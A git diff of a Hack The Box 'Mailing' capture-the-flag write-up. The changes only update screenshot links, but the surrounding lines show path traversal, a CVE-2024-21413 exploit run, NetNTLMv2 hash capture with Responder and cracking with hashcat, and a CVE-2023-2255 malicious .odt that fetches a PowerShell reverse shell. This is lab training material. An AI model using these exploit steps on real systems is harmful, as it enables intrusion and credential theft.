@@ -181,7 +181,7 @@ curl -s -X GET 'http://mailing.htb/download.php?file=..\..\..\..\..\..\..\Progra
 After several attempts we did not retrieve anything useful.  
 However, searching again we find another reference indicating a different path that aims to `server.ini`:
 
-![[dumb_information.png]]
+![](screenshots/dumb_information.png)
 
 We then test this new location, making sure to encode spaces with `%20` and properly closing the x86 parenthesis:
 
@@ -242,7 +242,7 @@ python3 CVE-2024-21413.py --s
 We have all information except the `recipient` user.
 Looking again the web, in the `instruction` files appears this screenshot:
 
-![[instructions_outlook_credentials.png]]
+![](screenshots/instructions_outlook_credentials.png)
 
 The mail from image is `maya@mailing.htb`. Let´s use it as Recipient and check if exists:
 
@@ -256,7 +256,7 @@ We need the responder active to obtain the hashes:
 sudo responder -I tun0
 ```
 
-![[responder.png]]
+![](screenshots/responder.png)
 
 In my case, the hash had already been captured previously, so I retrieved it from the Responder logs:
 
@@ -268,7 +268,7 @@ cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.11.14.txt
 
 Since all captured hashes are identical, we can extract one and save it to a file for cracking:
 
-![[hash_maya_saved.png]]
+![](screenshots/hash_maya_saved.png)
 
 Now let’s crack the captured hash.  
 First, we identify its type using **hashid**:
@@ -277,7 +277,7 @@ First, we identify its type using **hashid**:
 hashid hashes
 ```
 
-![[hashid_hash_maya.png]]
+![](screenshots/hashid_hash_maya.png)
 
 The result shows it is a NetNTLMv2 hash. This confirms that the captured hash can be cracked offline without interacting with the target system.
 Next, we use hashcat to check the supported hashmodes for NetNTLMv2:
@@ -286,7 +286,8 @@ Next, we use hashcat to check the supported hashmodes for NetNTLMv2:
 hashcat --example-hashes | grep -i "netntlmv2" -B 5
 ```
 
-![[hashcat_hashmode_maya.png]]
+![](screenshots/hashcat_hashmode_maya.png)
+
 
 Two possible modes are listed: 5600 (NetNTLMv2) and 27100 (NetNTLMv2 NT).
 In this case, the correct one is 5600.
@@ -338,11 +339,11 @@ We then convert the payload to Base64 to avoid formatting issues:
 cat payload | iconv -t utf-16le | base64 -w 0;echo
 ```
 
-![[payload_utf16.png]]
+![](screenshots/payload_utf16.png)
 
 Next, we host the payload using a simple Python web server:
 
-![[reverse_ps1.png]]
+![](screenshots/reverse_ps1.png)
 
 Now we generate a malicious .odt document with the payload embedded, using the exploit script for CVE-2023-2255:
 
@@ -350,16 +351,16 @@ Now we generate a malicious .odt document with the payload embedded, using the e
 python3 CVE-2023-2255.py --cmd 'cmd /c powershell -enc <BASE64_PAYLOAD>' --output exploit.odt
 ```
 
-![[exploit_odt.png]]
+![](screenshots/exploit_odt.png)
 
 Finally, we upload the malicious exploit.odt file into the Important Documents folder.
 After a few seconds, the file was automatically processed, triggering our payload and granting a reverse shell as SYSTEM:
 
-![[reverse_ps1_executed.png]]
+![](screenshots/reverse_ps1_executed.png)
 
 We now have full control over the machine and can read the root flag:
 
-![[GitHub Documentation/EASY/HTB_Mailing_Writeup/screenshots/root_flag.png]]
+![](screenshots/root_flag.png)
 
 🏁 Root flag obtained
 
